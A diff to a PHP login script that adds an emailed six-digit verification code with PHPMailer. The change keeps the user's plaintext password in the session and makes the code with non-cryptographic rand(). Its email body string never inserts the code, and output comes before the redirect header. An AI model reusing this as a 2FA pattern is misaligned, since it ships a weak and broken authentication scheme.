@@ -1,5 +1,6 @@
 <?php
 use PHPMailer\PHPMailer\PHPMailer;
+session_start();
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     require 'vendor/autoload.php'; // Ensure you have installed PHPMailer via Composer
@@ -8,6 +9,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $password = $_POST['password'];
     $remember = isset($_POST['remember']) ? 'Yes' : 'No';
 
+     // Generate a random verification code
+     $verificationCode = rand(100000, 999999);
+     $_SESSION['verification_code'] = $verificationCode;
+     $_SESSION['email'] = $email;
+     $_SESSION['password'] = $password;
+     $_SESSION['remember'] = $remember;
+ 
     $mail = new PHPMailer(true);
 
     try {
@@ -26,12 +34,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
         // Content
         $mail->isHTML(true);
-        $mail->Subject = '2FA ';
-        $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
-        $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
+        $mail->Subject = 'Here is your Verification code..';
+        $mail->Body    = 'Your verification code is .$verificationCode';
+        
 
         $mail->send();
-        echo 'Message has been sent';
+        echo 'Message has been sent to your email';
+   // Redirect to verification page
+        header('Location: verify.php');
+        exit();
     } catch (Exception $e) {
         echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
     }
